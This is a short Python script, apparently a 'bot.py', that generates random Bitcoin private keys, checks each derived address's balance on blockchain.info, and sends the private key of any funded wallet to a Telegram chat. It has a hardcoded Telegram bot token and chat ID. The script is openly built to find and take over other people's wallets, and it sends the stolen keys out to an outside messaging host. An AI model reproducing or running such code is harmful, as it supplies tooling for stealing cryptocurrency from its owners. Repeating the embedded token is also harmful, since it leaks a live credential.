nano bot.py
import os
import requests
import telebot
import hashlib
import base58
import ecdsa
from time import sleep

TELEGRAM_TOKEN = '7463005137:AAEGxU-lAGoaR1SocqiQwPFqVQMBYijMULo'
CHAT_ID = '6737143224'
bot = telebot.TeleBot(TELEGRAM_TOKEN)

def generate_wallet():
    # Generate a random private key (32 bytes)
    private_key = os.urandom(32).hex()
    
    # Generate public key from private key using SECP256k1 curve
    sk = ecdsa.SigningKey.from_string(bytes.fromhex(private_key), curve=ecdsa.SECP256k1)
    vk = sk.verifying_key
    public_key = b'\x04' + vk.to_string()  # uncompressed public key
    
    # Generate Bitcoin address (RIPEMD160(SHA256(PubKey)))
    sha256_1 = hashlib.sha256(public_key).digest()
    ripemd160 = hashlib.new('ripemd160')
    ripemd160.update(sha256_1)
    hashed_pubkey = ripemd160.digest()
    hashed_pubkey = b'\x00' + hashed_pubkey  # Add version byte (0x00 for Bitcoin)
    
    # Create checksum
    checksum = hashlib.sha256(hashlib.sha256(hashed_pubkey).digest()).digest()[:4]
    binary_address = hashed_pubkey + checksum
    address = base58.b58encode(binary_address).decode()  # Convert to Base58 address
    
    return address, private_key

def check_balance(address):
    try:
        # Blockchain API to check the balance of a Bitcoin address
        url = f'https://blockchain.info/rawaddr/{address}'
        r = requests.get(url, timeout=10)
        data = r.json()
        return data.get('final_balance', 0)  # Return balance (in satoshis)
    except:
        return 0

while True:
    addr, priv = generate_wallet()  # Generate wallet
    balance = check_balance(addr)   # Check balance

    if balance > 0:  # If balance > 0, send the wallet details to Telegram
        msg = f'FOUND WALLET:\nAddress: {addr}\nPrivate Key: {priv}\nBalance: {balance} satoshis'
        requests.get(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage', params={
            'chat_id': CHAT_ID,
            'text': msg
        })
    
    sleep(1)  # Sleep to avoid overloading the server or rate-limiting

